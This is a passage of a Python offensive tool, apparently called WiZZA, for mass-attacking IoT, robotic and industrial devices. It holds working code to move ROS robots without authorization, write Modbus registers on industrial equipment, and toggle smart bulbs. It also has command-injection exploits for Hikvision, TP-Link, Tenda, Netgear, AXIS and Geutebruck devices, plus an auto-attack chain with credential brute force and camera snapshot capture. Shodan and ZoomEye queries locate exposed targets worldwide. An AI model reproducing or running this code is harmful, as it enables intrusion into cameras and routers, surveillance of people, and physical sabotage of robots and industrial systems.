                        0, 0, 0,    # target (broadcast)
                        0, 0, 0,    # reserved
                        0,          # sequence
                        0, 0)       # type placeholder
    # simpler: just send fixed known GetService bytes
    pkt = bytes([
        0x24,0x00,0x00,0x34,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x02,0x00,0x00,0x00,
    ])
    devices = []
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.settimeout(5)
        s.sendto(pkt, (broadcast, 56700))
        deadline = time.time() + 5
        while time.time() < deadline:
            try:
                data, addr = s.recvfrom(1024)
                print(f"[+] LIFX bulb: {addr[0]}")
                devices.append(addr[0])
            except socket.timeout:
                break
        s.close()
    except Exception as e:
        print(f"[!] LIFX: {e}")

    # Turn all found bulbs off then on (power toggle PoC)
    for dev_ip in devices:
        print(f"[*] LIFX toggle: {dev_ip}")
        # SetPower off (type 0x0015 = 21)
        pkt_off = bytearray(46)
        struct.pack_into("<H", pkt_off, 0, 46)    # size
        struct.pack_into("<H", pkt_off, 2, 0x3414) # protocol
        struct.pack_into("<H", pkt_off, 32, 21)   # type = SetPower
        struct.pack_into("<H", pkt_off, 36, 0)    # level = off
        struct.pack_into("<I", pkt_off, 38, 0)    # duration
        try:
            s2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s2.sendto(bytes(pkt_off), (dev_ip, 56700))
            time.sleep(1)
            struct.pack_into("<H", pkt_off, 36, 65535)  # level = on
            s2.sendto(bytes(pkt_off), (dev_ip, 56700))
            s2.close()
        except Exception:
            pass
    return devices


def tuya_local_attack(ip, port=6668):
    """
    Tuya/Smart Life devices use an unencrypted local control protocol on TCP 6668.
    Older firmware (before ~2019) accepts plaintext JSON commands without auth.
    """
    print(f"[*] Tuya local control probe: {ip}:{port}")
    # Tuya local protocol v3.1 — get device state
    payload = json.dumps({
        "gwId": "",
        "devId": "",
        "uid": "",
        "t": str(int(time.time())),
    })
    # Tuya protocol header: prefix + version + cmd + payload
    prefix = b"\x00\x00\x55\xaa"
    version = b"3.1"
    cmd = struct.pack(">I", 10)   # DP_QUERY = 10
    plen = struct.pack(">I", len(payload) + 8 + 4)  # +header+crc
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((ip, port))
        s.send(prefix + struct.pack(">I", 0) + struct.pack(">I", 10) +
               struct.pack(">I", len(payload) + 12) + payload.encode() +
               struct.pack(">I", 0) +  # fake CRC
               b"\x00\x00\xaa\x55")
        resp = s.recv(1024)
        s.close()
        if resp:
            print(f"[+] Tuya device responded: {resp[:200]}")
            return True
    except Exception as e:
        print(f"[-] Tuya: {e}")
    return False


# ─────────────────────────────────────────────────────────────────────────────
# 7. ROS (Robot Operating System) attacks
# ─────────────────────────────────────────────────────────────────────────────

def ros_scan(target_ip, xmlrpc_port=11311):
    """
    ROS Master runs an XML-RPC server on :11311.
    No authentication — any node on the LAN can call API.
    Returns list of topics, nodes, services.
    """
    print(f"[*] ROS Master probe: {target_ip}:{xmlrpc_port}")
    try:
        import xmlrpc.client
        master = xmlrpc.client.ServerProxy(
            f"http://{target_ip}:{xmlrpc_port}/")
        caller = "/wizza_scan"

        # Get system state (publishers, subscribers, services)
        code, msg, val = master.getSystemState(caller)
        if code == 1:
            pubs   = val[0]
            subs   = val[1]
            servs  = val[2]
            print(f"[+] ROS Master at {target_ip}:{xmlrpc_port}")
            print(f"    Publishers:   {len(pubs)}")
            print(f"    Subscribers:  {len(subs)}")
            print(f"    Services:     {len(servs)}")

            print("\n  Topics:")
            for topic_name, pub_nodes in pubs[:20]:
                print(f"    {topic_name}  (pubs: {pub_nodes})")

            print("\n  Services:")
            for srv_name, srv_nodes in servs[:20]:
                print(f"    {srv_name}  (provider: {srv_nodes})")

            # Try to get ROS_MASTER_URI param
            try:
                c2, m2, uri = master.getParam(caller, "/")
                if c2 == 1 and isinstance(uri, dict):
                    print(f"\n  ROS params: {list(uri.keys())[:10]}")
            except Exception:
                pass

            return {"publishers": pubs, "subscribers": subs, "services": servs}
    except Exception as e:
        print(f"[-] ROS probe failed: {e}")
    return None


def ros_subscribe(target_ip, topic="/cmd_vel", duration=10, xmlrpc_port=11311):
    """
    Subscribe to a ROS topic and print messages.
    /cmd_vel = robot velocity (Twist messages)
    /scan    = LiDAR scan data
    /image_raw = camera feed
    /joint_states = robot arm joints
    """
    if not shutil.which("rostopic"):
        print("[!] rostopic not in PATH — install ROS or set ROS_MASTER_URI")
        # Try direct with env
        env = os.environ.copy()
        env["ROS_MASTER_URI"] = f"http://{target_ip}:{xmlrpc_port}"
        if shutil.which("rostopic"):
            pass
    print(f"[*] Subscribing to ROS topic {topic} for {duration}s")
    env2 = os.environ.copy()
    env2["ROS_MASTER_URI"] = f"http://{target_ip}:{xmlrpc_port}"
    try:
        proc = subprocess.Popen(
            ["rostopic", "echo", topic],
            env=env2, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        output, _ = proc.communicate(timeout=duration)
        print(output.decode(errors="replace")[:2000])
    except Exception as e:
        print(f"[-] ROS subscribe: {e}")


def ros_inject_velocity(target_ip, linear_x=1.0, angular_z=0.5,
                        xmlrpc_port=11311):
    """
    Publish velocity commands to /cmd_vel.
    This makes physical robots move without authorization.
    """
    if not shutil.which("rostopic"):
        print("[!] rostopic not found")
        return False
    env2 = os.environ.copy()
    env2["ROS_MASTER_URI"] = f"http://{target_ip}:{xmlrpc_port}"
    msg = (f"linear: {{x: {linear_x}, y: 0.0, z: 0.0}}, "
           f"angular: {{x: 0.0, y: 0.0, z: {angular_z}}}")
    print(f"[*] ROS velocity inject → {target_ip}: {msg}")
    try:
        subprocess.run(
            f"rostopic pub -1 /cmd_vel geometry_msgs/Twist "
            f"\"{{linear: {{x: {linear_x}}}, angular: {{z: {angular_z}}}}}\"",
            shell=True, env=env2, timeout=10
        )
        return True
    except Exception as e:
        print(f"[-] ROS inject: {e}")
        return False


def ros2_scan(target_ip, dds_port=7400):
    """
    ROS2 uses DDS (Data Distribution Service) — no central master.
    Probe via DDS discovery packets or rtps multicast.
    """
    print(f"[*] ROS2/DDS probe: {target_ip}")
    if shutil.which("ros2"):
        env2 = os.environ.copy()
        env2["RMW_IMPLEMENTATION"] = "rmw_fastrtps_cpp"
        out = _run("ros2 node list 2>/dev/null", capture=True, timeout=10)
        if out.strip():
            print(f"[+] ROS2 nodes:\n{out}")
            out2 = _run("ros2 topic list 2>/dev/null", capture=True, timeout=10)
            print(f"[+] ROS2 topics:\n{out2}")
            return out
        print("[-] No ROS2 nodes discovered")
    else:
        print("[!] ros2 CLI not found")
    return None


# ─────────────────────────────────────────────────────────────────────────────
# 8. Modbus / industrial protocol attacks
# ─────────────────────────────────────────────────────────────────────────────

def modbus_scan(ip, port=502):
    """
    Modbus TCP has NO authentication.
    Read coils, discrete inputs, holding registers, input registers.
    Common in PLCs, smart meters, HVAC, industrial equipment.
    """
    # Modbus Read Holding Registers request
    # Transaction ID=1, Protocol=0, Length=6, Unit ID=1
    # Function 3 (Read Holding Registers), Start=0, Count=10
    request = struct.pack(">HHHBBHH", 1, 0, 6, 1, 3, 0, 10)
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((ip, port))
        s.send(request)
        resp = s.recv(256)
        s.close()
        if len(resp) >= 9 and resp[7] == 3:
            byte_count = resp[8]
            registers = []
            for i in range(0, byte_count, 2):
                if 9 + i + 1 < len(resp):
                    val = struct.unpack(">H", resp[9+i:9+i+2])[0]
                    registers.append(val)
            print(f"[+] Modbus {ip}:{port} — {len(registers)} holding registers: {registers[:10]}")
            return registers
    except Exception as e:
        print(f"[-] Modbus: {e}")
    return None


def modbus_write(ip, register, value, port=502):
    """
    Modbus Write Single Register (FC=6) — no auth.
    Can control industrial equipment, HVAC setpoints, etc.
    """
    request = struct.pack(">HHHBBBHH", 1, 0, 6, 1, 6, 0, register, value)
    # Correct: transaction=1, protocol=0, length=6, unit=1, fc=6, reg, val
    request = struct.pack(">HHHBBHH", 1, 0, 6, 1, 6, register, value)
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((ip, port))
        s.send(request)
        resp = s.recv(64)
        s.close()
        if len(resp) >= 7 and resp[7] == 6:
            print(f"[+] Modbus write: {ip}  reg={register}  val={value}")
            return True
    except Exception as e:
        print(f"[-] Modbus write: {e}")
    return False


# ─────────────────────────────────────────────────────────────────────────────
# 9. CVE exploits for specific IoT devices
# ─────────────────────────────────────────────────────────────────────────────

def cve_hikvision_rce(ip, port=80, cmd="id"):
    """
    CVE-2021-36260 — Hikvision command injection via /SDK/webLanguage.
    Pre-auth RCE on Hikvision IP cameras and NVRs.
    Affects firmware before 2021-09-28 update.
    """
    print(f"[*] CVE-2021-36260 Hikvision RCE: {ip}:{port} — cmd: {cmd}")
    payload = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<language>$(echo -e "' + cmd + '" > /tmp/pwned)</language>'
    )
    # Simplified injection
    inject = f'$(bash -c "{cmd}" > /tmp/hikvision_rce.txt)'
    body = ('<?xml version="1.0" encoding="UTF-8"?>'
            f'<language>{inject}</language>')
    code, resp = _http_put(
        f"http://{ip}:{port}/SDK/webLanguage",
        body,
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    if code in (200, 201, 204):
        print(f"[+] Hikvision RCE sent (HTTP {code})")
        # Try to read result
        time.sleep(1)
        c2, r2 = _http_get(f"http://{ip}:{port}/SDK/language")
        print(f"    Response: {resp[:200]}")
        return True
    print(f"[-] Hikvision RCE: HTTP {code}")
    return False


def cve_tplink_rce(ip, port=80):
    """
    CVE-2023-1389 — TP-Link Archer AX21 unauthenticated command injection
    via /cgi-bin/luci/;stok=/locale endpoint.
    Vulnerable response: JSON with {"success":true} or {"error_code":0}.
    Non-vulnerable: HTML page, 404, 403.
    """
    print(f"[*] CVE-2023-1389 TP-Link RCE: {ip}:{port}")
    url = f"http://{ip}:{port}/cgi-bin/luci/;stok=/locale"
    data = "form=country&operation=write&country=$(id>%2Ftmp%2Ftp_rce.txt)"
    code, resp = _http_post(url, data,
                            headers={"Content-Type": "application/x-www-form-urlencoded"})
    r = resp.strip()
    # Vulnerable TP-Link LuCI endpoint returns compact JSON, not an HTML page
    is_json = r.startswith("{") or r.startswith("[")
    is_html = "<html" in r.lower() or "<!doctype" in r.lower()
    if code in (200, 204) and is_json and not is_html:
        print(f"[+] TP-Link injection sent — check /tmp/tp_rce.txt on device")
        return True
    print(f"[-] TP-Link CVE-2023-1389: HTTP {code} (not a TP-Link LuCI response)")
    return False


def cve_netgear_rce(ip, port=80):
    """
    CVE-2021-40847 — Netgear Circle parental control unauthenticated RCE.
    Affects Netgear RAX series routers with Circle parental controls enabled.
    Vulnerable: endpoint exists (not 404) and returns non-HTML content.
    """
    print(f"[*] CVE-2021-40847 Netgear Circle RCE: {ip}:{port}")
    url = f"http://{ip}:{port}/circle_update.php"
    inject = "$(id>/tmp/netgear_rce.txt)"
    data = f"update_url=http://evil.invalid/{inject}"
    code, resp = _http_post(url, data,
                            headers={"Content-Type": "application/x-www-form-urlencoded"})
    is_html = "<html" in resp.lower() or "<!doctype" in resp.lower()
    print(f"    HTTP {code}: {resp[:100]}")
    # Netgear's circle_update.php returns a short non-HTML response; 404 = not present
    if code in (200, 204) and not is_html:
        print(f"[+] Netgear Circle endpoint found — injection sent")
        return True
    print(f"[-] Netgear CVE-2021-40847: endpoint not present (HTTP {code})")
    return False


def cve_tenda_rce(ip, port=80):
    """
    CVE-2020-10987 — Tenda AC routers command injection via goform/setUsbUnload.
    Unauthenticated RCE.
    Vulnerable: goform endpoint returns short JSON/text, not a full HTML page.
    """
    print(f"[*] CVE-2020-10987 Tenda RCE: {ip}:{port}")
    url = f"http://{ip}:{port}/goform/setUsbUnload"
    inject = "$(id>/tmp/tenda_pwned.txt)"
    data = f"deviceName={inject}"
    code, resp = _http_post(url, data)
    is_html = "<html" in resp.lower() or "<!doctype" in resp.lower()
    if code == 200 and not is_html:
        print(f"[+] Tenda injection sent")
        return True
    print(f"[-] Tenda CVE-2020-10987: endpoint not present (HTTP {code})")
    return False


def cve_axis_rce(ip, port=80):
    """
    CVE-2018-10660 — AXIS Communications camera shell command injection.
    Via /bin/handler, affects multiple AXIS camera models.
    Vulnerable info-leak response: key=value lines (e.g. 'users=admin ...').
    Non-vulnerable: HTML page (device returned its own home page).
    """
    print(f"[*] CVE-2018-10660 AXIS camera RCE: {ip}:{port}")
    payloads = [
        f"http://{ip}:{port}/axis-cgi/admin/pwdgrp.cgi?action=get",
        f"http://{ip}:{port}/axis-cgi/usergroup.cgi?action=list",
    ]
    for url in payloads:
        code, resp = _http_get(url)
        is_html = "<html" in resp.lower() or "<!doctype" in resp.lower()
        # AXIS CGI responses are key=value text, not HTML
        axis_markers = any(kw in resp for kw in ["users=", "groups=", "admin", "operator", "viewer"])
        if code == 200 and not is_html and axis_markers:
            print(f"[+] AXIS info leak: {url}")
            print(f"    {resp[:300]}")
            return True
    # Try command injection via parameter
    inject_url = (f"http://{ip}:{port}/axis-cgi/admin/param.cgi"
                  f"?action=update&root.brand.ProdNbr=$(id>/tmp/axis.txt)")
    code, resp = _http_get(inject_url)
    print(f"[-] AXIS CVE-2018-10660: no AXIS CGI endpoints found (HTTP {code})")
    return False


def cve_geutebruck_rce(ip, port=80):
    """
    CVE-2021-33544 — Geutebruck G-CAM/EFD-2 IP cameras command injection.
    Unauthenticated RCE via /uapi-cgi/viewer/testaction.cgi.
    Vulnerable response: short non-HTML reply from the CGI endpoint.
    """
    print(f"[*] CVE-2021-33544 Geutebruck RCE: {ip}:{port}")
    url = f"http://{ip}:{port}/uapi-cgi/viewer/testaction.cgi"
    inject = "id>/tmp/g_pwned.txt"
    data = f"cmd={inject}"
    code, resp = _http_post(url, data)
    is_html = "<html" in resp.lower() or "<!doctype" in resp.lower()
    if code == 200 and not is_html:
        print(f"[+] Geutebruck injection sent — result: {resp[:100]}")
        return True
    print(f"[-] Geutebruck CVE-2021-33544: endpoint not present (HTTP {code})")
    return False


def cve_dahua_auth_bypass(ip, port=37777):
    """
    Dahua DVR/NVR authentication bypass — certain firmware versions allow
    session token extraction via crafted login requests.
    """
    print(f"[*] Dahua auth bypass probe: {ip}:{port}")
    # Dahua uses a custom binary protocol on port 37777
    # Try HTTP interface first
    for http_port in [80, 8080]:
        url = f"http://{ip}:{http_port}/cgi-bin/snapshot.cgi?chn=0&st=0"
        code, resp = _http_get(url)
        if code == 200 and len(resp) > 100:
            print(f"[+] Dahua snapshot accessible without auth: {url}")
            out = f"/tmp/wizza_dahua_{ip}.jpg"
            try:
                import urllib.request
                urllib.request.urlretrieve(url, out)
                print(f"    Snapshot saved: {out}")
            except Exception:
                pass
            return True
    return False


# ─────────────────────────────────────────────────────────────────────────────
# 10. mDNS discovery
# ─────────────────────────────────────────────────────────────────────────────

def mdns_scan(duration=10):
    """
    Listen for mDNS announcements to discover IoT devices.
    Returns list of {name, ip, service, txt}.
    """
    devices = {}
    print(f"[*] mDNS passive listen for {duration}s...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        except AttributeError:
            pass
        s.bind(("", 5353))
        mreq = struct.pack("4sL", socket.inet_aton("224.0.0.251"),
                           socket.INADDR_ANY)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        s.settimeout(1)
        deadline = time.time() + duration
        while time.time() < deadline:
            try:
                data, addr = s.recvfrom(4096)
                ip = addr[0]
                if ip not in devices:
                    devices[ip] = {"ip": ip, "raw_len": len(data)}
                    # Very basic name extraction from DNS wire format
                    try:
                        pos = 12
                        labels = []
                        for _ in range(10):
                            if pos >= len(data):
                                break
                            length = data[pos]
                            if length == 0:
                                break
                            if length & 0xC0 == 0xC0:  # pointer
                                break
                            pos += 1
                            label = data[pos:pos+length].decode(errors="replace")
                            labels.append(label)
                            pos += length
                        if labels:
                            devices[ip]["name"] = ".".join(labels[:3])
                    except Exception:
                        pass
            except socket.timeout:
                pass
        s.close()
    except Exception as e:
        print(f"[!] mDNS: {e}")

    for ip, info in devices.items():
        print(f"  [mDNS] {ip}  name={info.get('name','?')}")
    return list(devices.values())


# ─────────────────────────────────────────────────────────────────────────────
# 11. CoAP probe (IoT protocol, UDP 5683)
# ─────────────────────────────────────────────────────────────────────────────

def coap_scan(ip, port=5683, timeout=3):
    """
    CoAP (RFC 7252) — UDP-based REST protocol used by many IoT devices.
    GET /.well-known/core to discover all resources.
    No authentication by default.
    """
    # CoAP GET request: Version=1, Type=0 (CON), TKL=0, Code=0.01 (GET)
    # MessageID=0x1234, Token=none, Option: URI-Path=.well-known/core
    msg_id = random.randint(0, 65535)
    header = struct.pack(">BBH", 0x40, 0x01, msg_id)
    # Uri-Path option: delta=11 (0xB), len of each segment
    path1 = b".well-known"
    path2 = b"core"
    opt1 = bytes([0xB0 | len(path1)]) + path1
    opt2 = bytes([0x00 | len(path2)]) + path2
    packet = header + opt1 + opt2

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(packet, (ip, port))
        resp, _ = s.recvfrom(4096)
        s.close()
        if len(resp) >= 4:
            code_class = (resp[1] >> 5) & 0x7
            code_detail = resp[1] & 0x1f
            payload_start = resp.find(b"\xff")
            payload = resp[payload_start+1:].decode(errors="replace") \
                if payload_start >= 0 else ""
            print(f"[+] CoAP {ip}:{port}  code={code_class}.{code_detail:02d}")
            if payload:
                print(f"    Resources: {payload[:500]}")
            return payload
    except Exception:
        pass
    return None


# ─────────────────────────────────────────────────────────────────────────────
# 12. Full auto-attack on discovered IoT devices
# ─────────────────────────────────────────────────────────────────────────────

def auto_attack(subnet, out_dir="/tmp", threads=64):
    """
    Full IoT auto-attack:
    1. Subnet scan for IoT ports
    2. mDNS + SSDP discovery
    3. Per-device: default cred brute, RTSP, MQTT, ONVIF, CVEs
    """
    print(f"\n[*] WiZZA IoT Auto-Attack: {subnet}")
    print(f"[*] Phase 1: SSDP multicast discovery...")
    ssdp_devs = ssdp_scan(timeout=5)
    for d in ssdp_devs:
        print(f"  [SSDP] {d['ip']}  {d['server']}  {d['location']}")

    print(f"\n[*] Phase 2: mDNS discovery (10s)...")
    mdns_devs = mdns_scan(duration=10)

    print(f"\n[*] Phase 3: Port scan {subnet}...")
    devices = scan_subnet(subnet, threads=threads)
    print_scan_results(devices)

    print(f"\n[*] Phase 4: Per-device attack...\n")
    results = []

    for dev in devices:
        ip = dev["ip"]
        ports = set(dev["open_ports"])
        dtype = dev["device_type"]
        result = {"ip": ip, "type": dtype, "findings": []}

        print(f"\n  [{_ts()}] Attacking {ip} ({dtype})")

        # Telnet brute
        if 23 in ports or 2323 in ports:
            port = 23 if 23 in ports else 2323
            cred = telnet_brute(ip, port=port)
            if cred:
                result["findings"].append(f"Telnet {cred[0]}:{cred[1]}")

        # SSH brute
        if 22 in ports:
            cred = ssh_brute(ip)
            if cred:
                result["findings"].append(f"SSH {cred[0]}:{cred[1]}")

        # HTTP default creds
        if 80 in ports or 8080 in ports:
            http_port = 80 if 80 in ports else 8080
            cred = camera_default_creds(ip, port=http_port)
            if cred:
                result["findings"].append(f"HTTP {cred[0]}:{cred[1]}")

        # RTSP
        if 554 in ports:
            streams = rtsp_brute(ip, port=554)
            for url in streams:
                result["findings"].append(f"RTSP: {url}")
                snapshot = capture_rtsp_snapshot(url,
                    out_file=f"{out_dir}/wizza_cam_{ip.replace('.','_')}.jpg")
                if snapshot:
                    result["findings"].append(f"Snapshot: {snapshot}")

        # ONVIF
        if 80 in ports or 8080 in ports:
            http_port = 80 if 80 in ports else 8080
            onvif = onvif_probe(ip, port=http_port)
            if onvif:
                result["findings"].append(f"ONVIF: {onvif.get('manufacturer','')} {onvif.get('model','')}")

        # MQTT
        if 1883 in ports:
            if mqtt_probe(ip, port=1883):
                result["findings"].append("MQTT open (no auth)")
                mqtt_attack(ip, port=1883)

        # CoAP
        if 5683 in ports:
            coap_resp = coap_scan(ip)
            if coap_resp:
                result["findings"].append(f"CoAP resources: {coap_resp[:100]}")

        # Modbus
        if 502 in ports:
            regs = modbus_scan(ip)
            if regs:
                result["findings"].append(f"Modbus registers: {regs[:5]}")

        # Hikvision CVE
        if 80 in ports and ("Hikvision" in dtype or 8000 in ports):
            cve_hikvision_rce(ip)
            result["findings"].append("CVE-2021-36260 attempted")

        # Dahua
        if 37777 in ports:
            cve_dahua_auth_bypass(ip)

        # TP-Link
        if 80 in ports and "TP-Link" in dtype:
            cve_tplink_rce(ip)

        # Tenda
        if 80 in ports:
            cve_tenda_rce(ip)

        if result["findings"]:
            print(f"  [+] {ip}: {result['findings']}")
        results.append(result)

    # Save results
    out_file = f"{out_dir}/wizza_iot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(out_file, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n[+] Results saved: {out_file}")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# 14. Shodan — internet-wide IoT discovery
# ─────────────────────────────────────────────────────────────────────────────

# Common IoT Shodan search queries
SHODAN_PRESETS = {
    "cameras":      "product:hikvision OR product:dahua OR product:axis OR webcam has_screenshot:true",
    "rtsp":         'port:554 "RTSP" -Set-Cookie',
    "mqtt":         "port:1883 MQTT",
    "modbus":       "port:502",
    "telnet_iot":   'port:23 "busybox" OR "mirai" OR "router"',
    "upnp":         "port:1900 \"UPnP\" \"IGD\"",
    "coap":         "port:5683",
    "hue":          '"Philips hue" port:80',
    "hikvision":    "product:Hikvision",
    "dahua":        "product:Dahua",
    "tplink":       "product:TP-Link",
    "netgear":      "product:Netgear",
    "default_creds": 'http.title:"Login" http.title:"admin" "admin" "password"',
    "routers":      'port:80 "router" "admin" "login"',
    "industrial":   'port:502 OR port:47808 OR port:20000',
}


def shodan_search(query, api_key, limit=100, country=None):
    """
    Search Shodan for internet-exposed IoT devices.
    Returns list of dicts: {ip, port, org, country, banner, product, version, cves}.
    Requires: pip install shodan
    """
    try:
        import shodan
    except ImportError:
        print("[!] shodan library not installed — run: pip install shodan")
        return []

    if not api_key:
        print("[!] No Shodan API key provided")
        return []

    # Expand preset aliases
    if query in SHODAN_PRESETS:
        query = SHODAN_PRESETS[query]
        print(f"[*] Shodan preset expanded: {query}")

    if country:
        query += f" country:{country}"

    print(f"[*] Shodan search: {query!r}  (limit={limit})")
    api = shodan.Shodan(api_key)
    results = []
    try:
        res = api.search(query, limit=limit)
        total = res.get("total", 0)
        print(f"[*] Total matches: {total}  (showing up to {limit})")
        for match in res.get("matches", []):
            ip   = match.get("ip_str", "")
            port = match.get("port", 0)
            org  = match.get("org", "")
            cc   = match.get("location", {}).get("country_code", "")
            banner   = match.get("data", "")[:200]
            product  = match.get("product", "")
            version  = match.get("version", "")
            vulns    = list(match.get("vulns", {}).keys())
            hostnames = match.get("hostnames", [])
            entry = {
                "ip": ip, "port": port, "org": org, "country": cc,
                "banner": banner, "product": product, "version": version,
                "cves": vulns, "hostnames": hostnames,
            }
            results.append(entry)
            cve_str = f"  CVEs: {' '.join(vulns)}" if vulns else ""
            print(f"  {ip}:{port}  {cc}  {org}  {product} {version}{cve_str}")
    except shodan.APIError as e:
        print(f"[!] Shodan API error: {e}")
    return results


def shodan_host(ip, api_key):
    """
    Full Shodan host lookup for a single IP.
    Returns raw Shodan host dict or None.
    """
    try:
        import shodan
    except ImportError:
        print("[!] shodan library not installed — run: pip install shodan")
        return None
    api = shodan.Shodan(api_key)
    try:
        host = api.host(ip)
        print(f"\n[*] Shodan host info: {ip}")
        print(f"    Org:       {host.get('org','?')}")
        print(f"    Country:   {host.get('country_name','?')}")
        print(f"    OS:        {host.get('os','?')}")
        print(f"    Hostnames: {host.get('hostnames', [])}")
        print(f"    Open ports: {host.get('ports', [])}")
        vulns = list(host.get("vulns", {}).keys())
        if vulns:
            print(f"    CVEs:      {' '.join(vulns)}")
        for svc in host.get("data", []):
            print(f"    [{svc.get('port')}] {svc.get('product','')} {svc.get('version','')}  {svc.get('data','')[:120]}")
        return host
    except shodan.APIError as e:
        print(f"[!] Shodan error for {ip}: {e}")
        return None


# ─────────────────────────────────────────────────────────────────────────────
# 15. ZoomEye — free internet-wide IoT discovery
# ─────────────────────────────────────────────────────────────────────────────

ZOOMEYE_BASE = "https://api.zoomeye.org"

# ZoomEye query presets — same names as Shodan presets for consistency
ZOOMEYE_PRESETS = {
    "cameras":      'app:"Hikvision" OR app:"Dahua" OR app:"AXIS" OR app:"webcam"',
    "rtsp":         'service:"rtsp"',
    "mqtt":         'service:"mqtt"',
    "modbus":       'service:"modbus"',
    "telnet_iot":   'service:"telnet" app:"busybox"',
    "upnp":         'service:"upnp"',
    "coap":         'service:"coap"',
    "hue":          'app:"Philips hue"',
    "hikvision":    'app:"Hikvision"',
    "dahua":        'app:"Dahua"',
    "tplink":       'app:"TP-LINK"',
    "netgear":      'app:"Netgear"',
    "routers":      'app:"router" service:"http"',
    "industrial":   'service:"modbus" OR service:"bacnet" OR service:"dnp3"',
    "default_creds": 'title:"Login" title:"admin"',
}


def zoomeye_search(query, api_key, limit=100, country=None, page_limit=None):
    """
    Search ZoomEye for internet-exposed IoT devices.
    Free tier: ~10,000 results/month.
    Returns list of dicts: {ip, port, country, org, app, version, banner, os}.
    Auth: JWT API key from zoomeye.org profile.
    """
    import urllib.request, urllib.parse

    if not api_key:
        print("[!] No ZoomEye API key — register free at zoomeye.org")
        return []

    # Expand preset
    if query in ZOOMEYE_PRESETS:
        query = ZOOMEYE_PRESETS[query]
        print(f"[*] ZoomEye preset expanded: {query}")

    if country:
        query += f' country:"{country}"'

    headers = {
        "Authorization": f"JWT {api_key}",
        "Content-Type":  "application/json",
    }

    results = []
    page = 1
    max_pages = page_limit or ((limit // 20) + 1)  # ZoomEye returns 20 per page

    print(f"[*] ZoomEye search: {query!r}  (limit={limit})")

    while len(results) < limit and page <= max_pages:
        params = urllib.parse.urlencode({"query": query, "page": page})
        url = f"{ZOOMEYE_BASE}/host/search?{params}"
        req = urllib.request.Request(url, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                data = json.loads(resp.read().decode())
        except Exception as e:
            print(f"[!] ZoomEye request error (page {page}): {e}")
            break

        if "error" in data:
            print(f"[!] ZoomEye API error: {data['error']}")
            break

        total = data.get("total", 0)
        if page == 1:
            print(f"[*] Total matches: {total}  (showing up to {limit})")

        matches = data.get("matches", [])
        if not matches:
            break

        for m in matches:
            ip      = m.get("ip", "")
            portinfo = m.get("portinfo", {})
            port    = portinfo.get("port", 0)
            app     = portinfo.get("app", "")
            version = portinfo.get("version", "")
            banner  = portinfo.get("banner", "")[:200]
            os_     = m.get("system", {}).get("os", "")
            geoinfo = m.get("geoinfo", {})
            cc      = geoinfo.get("country", {}).get("short", "")
            org     = geoinfo.get("organization", "")
            entry = {
                "ip": ip, "port": port, "country": cc, "org": org,
                "app": app, "version": version, "banner": banner, "os": os_,
            }
            results.append(entry)
            print(f"  {ip}:{port}  {cc}  {org}  {app} {version}")
            if len(results) >= limit:
                break

        page += 1

    print(f"[*] ZoomEye: {len(results)} results collected")
    return results


def zoomeye_host(ip, api_key):
    """
    ZoomEye single-IP host lookup — all known ports/services for that IP.
    Returns raw ZoomEye host dict or None.
    """
    import urllib.request

    if not api_key:
        print("[!] No ZoomEye API key")
        return None

    headers = {"Authorization": f"JWT {api_key}"}
    url = f"{ZOOMEYE_BASE}/host/{ip}"
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read().decode())
    except Exception as e:
        print(f"[!] ZoomEye host lookup error for {ip}: {e}")
        return None

    if "error" in data:
        print(f"[!] ZoomEye error for {ip}: {data['error']}")
        return None

    print(f"\n[*] ZoomEye host info: {ip}")
    geoinfo = data.get("geoinfo", {})
    print(f"    Country:  {geoinfo.get('country', {}).get('names', {}).get('en', '?')}")
    print(f"    City:     {geoinfo.get('city', {}).get('names', {}).get('en', '?')}")
    print(f"    Org:      {geoinfo.get('organization', '?')}")
    print(f"    ASN:      {geoinfo.get('asn', '?')}")
    for svc in data.get("data", []):
        pi = svc.get("portinfo", {})
        print(f"    [{pi.get('port')}] {pi.get('app','')} {pi.get('version','')}  {pi.get('banner','')[:100]}")
    return data


# ─────────────────────────────────────────────────────────────────────────────
# 16. External single-host attack (internet-routable targets)
# ─────────────────────────────────────────────────────────────────────────────

# Ports to probe on external IoT targets (no LAN-only ports like mDNS 5353)
EXTERNAL_IOT_PORTS = [
    21, 22, 23, 80, 443, 554, 1883, 8080, 8443, 8883,
    5683, 502, 47808, 37777, 34567, 9000, 8000,
    11311, 7400, 20000, 4786, 6668,
]


def external_attack(ip, ports=None, out_dir="/tmp", api_key=None, zoomeye_key=None):
    """
    Full IoT attack against a single internet-routable IP.
    Skips multicast-only steps (SSDP/mDNS) which require LAN.
    If api_key provided: Shodan enrichment.
    If zoomeye_key provided: ZoomEye enrichment (free tier).
    """
    print(f"\n[*] WiZZA External IoT Attack: {ip}")
    result = {"ip": ip, "findings": [], "ports": []}

    # Optional: ZoomEye enrichment (free)
    if zoomeye_key:
        host_info = zoomeye_host(ip, zoomeye_key)
        if host_info:
            result["zoomeye"] = host_info
            zy_ports = set()
            for svc in host_info.get("data", []):
                p = svc.get("portinfo", {}).get("port")
                if p:
                    zy_ports.add(int(p))
